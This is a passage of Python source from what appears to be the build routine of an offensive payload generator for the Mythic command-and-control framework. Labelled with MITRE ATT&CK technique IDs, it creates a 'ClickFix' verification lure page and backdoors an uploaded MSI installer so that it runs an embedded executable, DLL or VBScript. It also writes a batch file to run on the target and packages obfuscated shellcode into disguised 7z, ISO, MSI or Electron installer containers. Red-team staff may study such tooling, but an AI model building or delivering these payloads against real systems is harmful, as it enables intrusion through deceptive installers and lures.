                                payload_path=str(payload_exe),
                                output_filename="document.html",
                                download_name=download_name,
                                payload_dir=payload_dir,
                            )

                        case "ClickFix":
                            clickfix_cmd = self.get_parameter("0.9c ClickFix Command")
                            trigger_path = create_clickfix_trigger(
                                command=clickfix_cmd,
                                output_filename="verify.html",
                                payload_dir=payload_dir,
                            )

                    if trigger_path:
                        response.status = BuildStatus.Success
                        response.build_message = f"{trigger_type} Trigger created!"

                        await self._build_step("[T1137.006] - Adding Trigger", f"{trigger_type} Trigger created at: {trigger_path}", success=True)
                except Exception as e:
                    response.status = BuildStatus.Error
                    response.build_message = f"Failed to create {trigger_type} trigger: {str(e)}"
                    await self._build_step("[T1137.006] - Adding Trigger", f"CRITICAL ERROR: Failed to create {trigger_type} trigger: {str(e)}", success=False)
                    return response
            ######################### End Of Trigger Generation Section #########################
            ######################### MSI Backdooring Section #########################

            # Stage MSI and write helper batch file if the operator enabled it
            if self.get_parameter("5.3 Enable MSI Backdoor"):
                msi_backdoor_uuid = self.get_parameter("5.4 MSI Backdoor File")
                if msi_backdoor_uuid:
                    # Download the MSI content
                    file_resp = await SendMythicRPCFileGetContent(
                        MythicRPCFileGetContentMessage(AgentFileId=msi_backdoor_uuid)
                    )
                    if not file_resp.Success or not file_resp.Content:
                        await self._build_step("[T1218.007] - Staging MSI", "Failed to download uploaded MSI file from Mythic", success=False)
                    else:
                        file_content = await getFileFromMythic(
                            agentFileId=msi_backdoor_uuid
                        )

                        # Resolve original filename via Mythic file search
                        original_msi_name = f"source_{msi_backdoor_uuid}.msi"
                        try:
                            name_resp = await SendMythicRPCFileSearch(
                                MythicRPCFileSearchMessage(AgentFileID=msi_backdoor_uuid)
                            )
                            if name_resp.Success and name_resp.Files:
                                candidate = name_resp.Files[0].Filename
                                if candidate and candidate.lower().endswith(".msi"):
                                    original_msi_name = candidate
                        except Exception:
                            pass  # fall back to uuid-based name

                        # Stage the source MSI into payload_dir
                        msi_payload_dir = Path(agent_build_path) / "payload"
                        msi_payload_dir.mkdir(parents=True, exist_ok=True)
                        staged_source_msi = msi_payload_dir / original_msi_name
                        staged_source_msi.write_bytes(file_content)

                        # Collect build parameters for the helper invocation
                        msi_attack_type   = self.get_parameter("5.5 MSI Attack Type") or "execute"
                        msi_entry_point   = self.get_parameter("5.6 MSI Entry Point") or ""
                        msi_command_args  = self.get_parameter("5.7 MSI Command Arguments") or ""
                        msi_condition     = self.get_parameter("5.8 MSI Execution Condition") or "NOT REMOVE"
                        msi_custom_action = self.get_parameter("5.9 MSI Custom Action Name") or ""

                        if not msi_custom_action:
                            import random as _r, string as _s
                            msi_custom_action = ''.join(_r.choices(_s.ascii_letters, k=8))

                        # Determine expected payload filename based on attack type
                        if msi_attack_type in ("load-dll", "dotnet"):
                            msi_payload_filename = "erebus.dll"
                        elif msi_attack_type == "script":
                            msi_payload_filename = "erebus.vbs"
                        else:
                            msi_payload_filename = "erebus.exe"

                        backdoored_name = f"{Path(original_msi_name).stem}-backdoored.msi"

                        # Build the erebus_helper.py command line with all parameters baked in
                        cmd_parts = [
                            "python erebus_helper.py msi",
                            f'--msi-file "{original_msi_name}"',
                            f'--payload "{msi_payload_filename}"',
                            f'--output "{backdoored_name}"',
                            f'--attack-type {msi_attack_type}',
                            f'--condition "{msi_condition}"',
                            f'--custom-action-name {msi_custom_action}',
                        ]
                        if msi_entry_point:
                            cmd_parts.append(f'--entry-point "{msi_entry_point}"')
                        if msi_command_args:
                            cmd_parts.append(f'--arguments "{msi_command_args}"')

                        bat_lines = [
                            "@echo off",
                            "REM Erebus MSI Backdoor - run this on the Windows target after extracting the archive.",
                            "REM Requires: python erebus_helper.py (bundled) + the payload executable.",
                            "REM Requires Python 3.11 or lower for MSILib to work correctly (Python 3.12+ deprecates MSILib).",
                            "",
                            " ^\r\n    ".join(cmd_parts),
                            "",
                            "if %errorlevel% neq 0 (",
                            "    echo [!] Backdooring failed - check parameters and re-run manually.",
                            ") else (",
                            f'    echo [+] Backdoored MSI written to: {backdoored_name}',
                            ")",
                        ]
                        bat_path = msi_payload_dir / "backdoor_msi.bat"
                        bat_path.write_text("\r\n".join(bat_lines), encoding="utf-8")

                        await self._build_step("[T1218.007] - Staging MSI", f"Staged: {original_msi_name}\n"
                                f"Run backdoor_msi.bat on Windows to produce {backdoored_name}\n"
                                f"Attack: {msi_attack_type}  |  Action: {msi_custom_action}  |  Condition: {msi_condition}", success=True)

            ######################### End Of MSI Backdooring Section #########################
            ######################### Windows Helper Export #########################

            # Export Erebus.Helper as a single merged Python script so it
            # can be run directly (python erebus_helper.py <cmd>) or compiled
            # to a standalone exe with PyInstaller on the target Windows host.
            try:
                helper_src = Path(__file__).parent.parent / "agent_code" / "Erebus.Helper"
                helper_out = Path(agent_build_path) / "payload" / "erebus_helper.py"

                if helper_src.exists():
                    self._bundle_helper_as_single_file(helper_src, helper_out)
                    output += "[+] Exported Erebus.Helper as erebus_helper.py\n"

                    await self._build_step("[T1036] - Exporting Helper", "Exported Erebus.Helper as single-file erebus_helper.py", success=True)
            except Exception as e:
                output += f"[!] Warning: Failed to export helper: {str(e)}\n"

            ######################### IOCs Generation #########################

            # Add all files in payload directory to IOCs list
            if os.path.exists(payload_dir):
                for root, dirs, files in os.walk(payload_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        self.add_to_iocs(iocs_list, file_path, generation_timestamp)

            # Generate IOCs file
            iocs_file_path = os.path.join(payload_dir, "IOCs.txt")
            self.generate_iocs_file(iocs_list, iocs_file_path)
            output += f"[+] Generated IOCs file: IOCs.txt ({len(iocs_list)} files tracked)\n"

            await self._build_step("[T1005] - Gathering Files", f"Generated IOCs tracking file with {len(iocs_list)} hashes", success=True)

            ######################### Final Payload / Container #########################

            # 1. Capture context for container function
            if 'payload_path' in locals():
                final_path = payload_path
            else:
                final_path = obfuscated_shellcode_path

            self.generated_payload_path = final_path
            self.agent_build_path = agent_build_path

            # 2. Attempt Containerization
            container_path = await self.containerise_payload(agent_build_path)

            if container_path:
                # Case A: Container created (7z/MSI)
                with open(container_path, "rb") as f:
                    response.payload = f.read()

                container = self.get_parameter("3.0 Container Type")
                match container:
                    case "7z":
                        filename = "payload"
                        ext = "7z"
                    case "Zip":
                        filename = "payload"
                        ext = "zip"
                    case "MSI":
                        filename = "ErebusInstaller"
                        ext = "msi"
                    case "ISO":
                        filename = "payload"
                        ext = "iso"
                    case "Electron":
                        filename = "ErebusInstaller"
                        ext = "exe"
                    case _:
                        filename = "payload"
                        ext = "exe"

                response.updated_filename = f"{filename}.{ext}"
                response.status = BuildStatus.Success
                response.build_message = f"Success! Containerized ({container})"

                await self._build_step("[T1027] - Containerising", f"Payload packaged into {container} container", success=True)

            return response

        except Exception as e:
            response.status = BuildStatus.Error
            response.build_message = f"Error building wrapper: {str(e)}\n{output}"
            return response
